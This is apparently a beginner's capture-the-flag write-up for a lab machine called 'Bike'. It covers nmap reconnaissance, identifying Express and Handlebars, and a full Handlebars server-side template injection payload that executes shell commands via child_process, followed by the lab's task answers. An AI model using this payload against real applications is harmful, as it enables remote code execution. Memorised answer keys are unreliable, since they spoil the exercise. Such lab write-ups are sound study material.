# BIKE

First reaction nmap and going to the navigator seeing if is there anything reachable.<br/><br/>
Nmap reach two ports the 22 and the 80.<br/>
On the port 22 there is like always the ssh service! <br/>
And on the port 80 we can see that there is a service called `Node.js`<br/>
On the navigator something is reachable but nothing really exploitable.<br/>
So first thing first let's do a gobuster!!! <br/><br/>
Nothing!!! Hum... <br/>

According to wapalyser we can know that the framework used to run the site is express.<br/><br/>

Now that we have all oh this and after some research I did have to go to the walktrough and notice that I have to learn something new! The `server side template injection`. 🫠 <br/>

So let's close the welktrough and trying by myself!! Let's go to Hacktrick!<br/>
I learn that there is some test to do to know what's the engine running on this server! [Source](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)<br/>
So I did a `fuzzing template`! and noticed that an error occur and i can read on the 4th line the root used by the server to run it and, also discovered the service running it is `handlebars`! <br/>
Let's visit the payloads i got from git hub! `Server Side Template Injection` directory opening the read me and looking for the handlebars engine!<br/><br/>

Here's what i got:

```bash
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Directly try it on the website!! Obviously nothing happend, still an error occur! <br/>
... research 😑<br/><br/>

I have to convert it with decoder in Burpsuit!! `URL`! Try it again!! No error anymore the website just return the the url i gave in the comment below the email entry bar.<br/>
So now I have to adjust the code to get what I want! 🥵




## Task 01
```bash
22,80
```
---
## Task 02
```bash
node.js
```
---
## Task 03
```bash
express
```
---
## Task 04
```bash
server side template injection
```
---
## Task 05
```bash
handlebars
```
---
## Task 06
```bash
decoder
```
---

